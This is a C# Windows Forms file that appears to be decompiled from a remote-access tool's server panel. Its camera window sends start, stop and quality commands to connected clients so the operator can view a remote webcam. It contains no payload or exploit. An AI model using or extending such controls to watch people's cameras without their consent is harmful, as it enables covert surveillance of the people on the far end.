using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormCamera : FormMaterial
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	public Clients client;

	public Clients parrent;

	private IContainer components;

	public NumericUpDown numericUpDown2;

	public PictureBox pictureBox1;

	public MaterialSwitch materialSwitch1;

	public RJComboBox rjComboBox1;

	private Panel panel1;

	public Timer timer1;

	public FormCamera()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			if (rjComboBox1.SelectedIndex == -1)
			{
				materialSwitch1.Checked = false;
				return;
			}
			client.Send(LEB128.Write(new object[3]
			{
				"Start",
				(byte)numericUpDown2.Value,
				(byte)rjComboBox1.SelectedIndex
			}));
		}
		else
		{
			client.Send(LEB128.Write(new object[1] { "Stop" }));
		}
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void numericUpDown2_ValueChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			client.Send(new object[2]
			{
				"Quality",
				(byte)numericUpDown2.Value
			});
		}
	}

	private void FormCamera_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
		numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.panel1 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		base.SuspendLayout();
		this.numericUpDown2.BackColor = System.Drawing.Color.White;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.Enabled = false;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown2.Location = new System.Drawing.Point(112, 78);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 22;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.numericUpDown2.ValueChanged += new System.EventHandler(numericUpDown2_ValueChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.BackColor = System.Drawing.Color.White;
		this.pictureBox1.Location = new System.Drawing.Point(6, 109);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(813, 422);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 21;
		this.pictureBox1.TabStop = false;
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.BackColor = System.Drawing.Color.White;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 69);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 20;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = false;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.rjComboBox1.BackColor = System.Drawing.Color.White;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(180, 73);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(250, 30);
		this.rjComboBox1.TabIndex = 23;
		this.rjComboBox1.Texts = "";
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(819, 470);
		this.panel1.TabIndex = 24;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(825, 537);
		base.Controls.Add(this.rjComboBox1);
		base.Controls.Add(this.numericUpDown2);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.materialSwitch1);
		base.Controls.Add(this.panel1);
		base.Name = "FormCamera";
		this.Text = "Camera";
		base.Load += new System.EventHandler(FormCamera_Load);
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
